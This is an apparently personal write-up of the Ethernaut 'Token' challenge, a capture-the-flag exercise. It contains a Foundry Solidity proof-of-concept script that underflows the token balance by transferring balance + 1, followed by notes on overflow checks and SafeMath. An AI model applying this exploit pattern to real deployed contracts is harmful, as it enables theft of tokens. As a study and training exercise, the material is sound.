---
title: "Token"
date: "2024-02-01"
lastmod: "2024-02-14T16:51:00.000Z"
draft: false
difficulty: "⭐⭐"
prev: "Telephone-8b2069f0beb045b69400a28665c1d56c"
weight: 6
state: "Terminé"
level-url: "https://ethernaut.openzeppelin.com/level/5"
next: "Delegation-0c005c8b167c4966926771bad0ff918c"
type: "docs"
NOTION_METADATA:
  object: "page"
  id: "4a8cb876-5f8c-4121-90f2-db4a7989f9b5"
  created_time: "2024-02-12T13:39:00.000Z"
  last_edited_time: "2024-02-14T16:51:00.000Z"
  created_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  last_edited_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  cover: null
  icon:
    type: "external"
    external:
      url: "https://ethernaut.openzeppelin.com/imgs/BigLevel5.svg"
  parent:
    type: "database_id"
    database_id: "cb6853ff-d731-4d6a-9080-6c8efeec5b1c"
  archived: false
  properties:
    difficulty:
      id: "IAjo"
      type: "select"
      select:
        id: "2fa50c76-9c63-4f19-b03a-b8fb1889da7c"
        name: "⭐⭐"
        color: "blue"
    prev:
      id: "LLP%5C"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Telephone-8b2069f0beb045b69400a28665c1d56c"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Telephone-8b2069f0beb045b69400a28665c1d56c"
          href: null
    date:
      id: "Y%40Gy"
      type: "date"
      date:
        start: "2024-02-01"
        end: null
        time_zone: null
    weight:
      id: "%5Dyda"
      type: "number"
      number: 6
    state:
      id: "f%40ps"
      type: "status"
      status:
        id: "abb7fad3-add1-4b13-946c-06bff36598bf"
        name: "Terminé"
        color: "green"
    level-url:
      id: "juZs"
      type: "url"
      url: "https://ethernaut.openzeppelin.com/level/5"
    next:
      id: "pocA"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Delegation-0c005c8b167c4966926771bad0ff918c"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Delegation-0c005c8b167c4966926771bad0ff918c"
          href: null
    type:
      id: "s%7DKc"
      type: "select"
      select:
        id: "OnJy"
        name: "docs"
        color: "default"
    title:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "Token"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Token"
          href: null
  url: "https://www.notion.so/Token-4a8cb8765f8c412190f2db4a7989f9b5"
  public_url: null
UPDATE_TIME: "2024-02-15T12:45:48.788Z"

---
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface Token {
  function transfer(address _to, uint _value) external returns (bool);

  function balanceOf(address _owner) external view returns (uint balance);
}

contract POC is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address addr = vm.envAddress("INSTANCE_05");
        address publicKey = vm.envAddress("PUBLIC_KEY");

        vm.startBroadcast(deployerPrivateKey);
        Token token = Token(addr);
        uint balance = token.balanceOf(publicKey);
        console.logUint(balance);
        token.transfer(address(0), balance + 1);
        balance = token.balanceOf(publicKey);
        console.logUint(balance);

        vm.stopBroadcast();
    }
}
```


The goal of this level is for you to hack the basic token contract below.


You are given 20 tokens to start with and you will beat the level if 
you somehow manage to get your hands on any additional tokens. 
Preferably a very large amount of tokens.


Things that might help:

- What is an odometer?

Overflows are very common in solidity and must be checked for with control statements such as:


```text
if(a + c > a) {
  a = a + c;
}

```


An easier alternative is to use OpenZeppelin's SafeMath library that 
automatically checks for overflows in all the mathematical operators. 
The resulting code looks like this:


```text
a = a.add(c);

```


If there is an overflow, the code will revert.

